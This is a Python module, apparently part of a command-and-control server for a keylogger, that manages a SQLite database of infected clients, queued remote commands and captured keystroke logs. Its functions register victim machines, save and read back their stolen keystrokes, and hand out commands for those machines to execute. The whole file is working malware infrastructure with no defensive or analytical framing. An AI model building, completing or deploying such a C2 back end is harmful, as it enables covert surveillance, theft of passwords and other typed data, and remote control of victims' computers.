# CommandAndControl/db.py
import sqlite3, pathlib, contextlib
from datetime import datetime, timezone, timedelta

DB_PATH = pathlib.Path(__file__).with_name("c2.db")

SCHEMA = """
CREATE TABLE IF NOT EXISTS clients (
    id         TEXT PRIMARY KEY,
    os         TEXT,
    arch       TEXT,
    status     TEXT,
    registered TIMESTAMP,
    last_seen  TIMESTAMP
);
CREATE TABLE IF NOT EXISTS commands (
    id      TEXT PRIMARY KEY,    -- client id
    cmd     TEXT,
    FOREIGN KEY(id) REFERENCES clients(id)
);
CREATE TABLE IF NOT EXISTS keylogs (
    id      TEXT,
    ts      TIMESTAMP,
    log     BLOB,
    PRIMARY KEY(id, ts)
);
"""

# ─── keylog helpers ──────────────────────────────────────────────────────────
def store_log(cid: str, raw: bytes):
    import datetime as dt, pathlib
    now =datetime.now(timezone.utc)
    log_dir = pathlib.Path(__file__).with_name("logs") / cid
    log_dir.mkdir(parents=True, exist_ok=True)

    file_path = log_dir / f"{now:%Y%m%d_%H%M%S}.log"
    file_path.write_bytes(raw)

    with contextlib.closing(get_conn()) as c:
        c.execute("INSERT INTO keylogs(id,ts,log) VALUES (?,?,?)",
                  (cid, now, raw))
        c.commit()

# ─── stale-client sweeper ───────────────────────────────────────────────────
def mark_stale(threshold_secs=90):
    import datetime as dt
    cutoff = datetime.now(timezone.utc) - dt.timedelta(seconds=threshold_secs)
    with contextlib.closing(get_conn()) as c:
        c.execute("""UPDATE clients
                       SET status='inactive'
                     WHERE last_seen < ? AND status='active'""",
                  (cutoff,))
        c.commit()

def get_conn():
    conn = sqlite3.connect(DB_PATH, detect_types=sqlite3.PARSE_DECLTYPES)
    conn.row_factory = sqlite3.Row
    return conn

# one-time initialisation
with contextlib.closing(get_conn()) as c:
    c.executescript(SCHEMA)
    c.commit()

def upsert_client(cid, os_, arch_):
    now = datetime.now(timezone.utc)
    with contextlib.closing(get_conn()) as c:
        c.execute("""INSERT INTO clients(id, os, arch, status, registered, last_seen)
                     VALUES (?,?,?,?,?,?)
                     ON CONFLICT(id) DO UPDATE
                     SET last_seen=excluded.last_seen,
                         os=excluded.os,
                         arch=excluded.arch,
                         status='active';""",
                  (cid, os_, arch_, "active", now, now))
        c.commit()

def fetch_clients():
    with contextlib.closing(get_conn()) as c:
        return c.execute("SELECT * FROM clients").fetchall()

def fetch_logs(cid: str):
    """Return list[(timestamp, text)] newest-first."""
    with contextlib.closing(get_conn()) as c:
        rows = c.execute("""SELECT ts, log
                              FROM keylogs
                             WHERE id=?
                          ORDER BY ts DESC""", (cid,)).fetchall()
        return [(r["ts"], r["log"].decode(errors="replace")) for r in rows]


def pop_command(cid):
    with contextlib.closing(get_conn()) as c:
        row = c.execute("SELECT cmd FROM commands WHERE id=?", (cid,)).fetchone()
        if row:
            c.execute("DELETE FROM commands WHERE id=?", (cid,))
            c.commit()
            return row["cmd"]
    return None

def queue_command(cid, cmd):
    with contextlib.closing(get_conn()) as c:
        c.execute("INSERT OR REPLACE INTO commands(id,cmd) VALUES (?,?)", (cid, cmd))
        c.commit()

